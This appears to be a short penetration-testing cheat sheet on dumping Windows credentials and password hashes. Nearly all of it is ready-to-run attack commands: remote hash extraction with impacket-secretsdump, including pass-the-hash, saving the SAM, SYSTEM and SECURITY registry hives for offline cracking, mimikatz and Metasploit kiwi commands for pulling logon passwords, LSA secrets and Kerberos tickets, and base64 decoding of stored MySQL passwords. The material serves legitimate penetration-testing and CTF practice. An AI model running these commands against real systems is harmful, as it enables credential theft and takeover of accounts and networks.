# Dump Hashes

## Impacket-Secretsdump

```
python3 secretsdump.py <domain.name>/<user>:<password>@<ip> 
python3 secretsdump.py <domain.name>/<user>@ip -hashes <ntlm:ntlm>

impacket-secretsdump backup@spookysec.local # requires password for user
impacket-secretsdump Administrator@10.11.1.1 -hashes 'NTLM:NTLM'
impacket-secretsdump marvel/fcastle:Password1@192.168.183.137
```

## SAM / SYSTEM / SECURITY Hives

We can use the following hives as well to dump the hashes locally. This only requires the transfer of the SYSTEM, SAM, and SECURITY files onto our local machine. We could use whatever file transfer method is the most available to us.

```
reg.exe save hklm\system c:\Users\Administrator\system
reg.exe save hklm\security c:\Users\Administrator\security
reg.exe save hklm\sam c:\Users\Administrator\sam

Transfer them to our attacking machine.

secretsdump.py  -sam sam -system system -security security LOCAL
```

## mimikatz/pypykatz

{% embed url="https://adsecurity.org/?page_id=1821" %}

Need to match architecture

```bash
privilege::debug
20 ‘OK’

sekurlsa::logonPasswords
lsadump::sam
lsadump::sam /patch
lsadump::lsa /patch
lsadump::secrets
kerberos::list

mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam /patch" "lsadump::lsa /patch" "lsadump::secrets" "exit"

pypykatz lsa minidump filename.DMP
```

## Metasploit

```
load kiwi

creds_all
lsa_dump_lsa
lsa_dump_secrets
kerberos_list
```

## Base64 decode MySQL password

```
#inside mysql 
SELECT username, CONVERT(FROM_BASE64(password), CHAR) FROM users;
SELECT username, CONVERT(FROM_BASE64(FROM_BASE64(password)), CHAR) FROM users; # 2x encoded

echo 'SOMETHING123==' | base64 -d
```
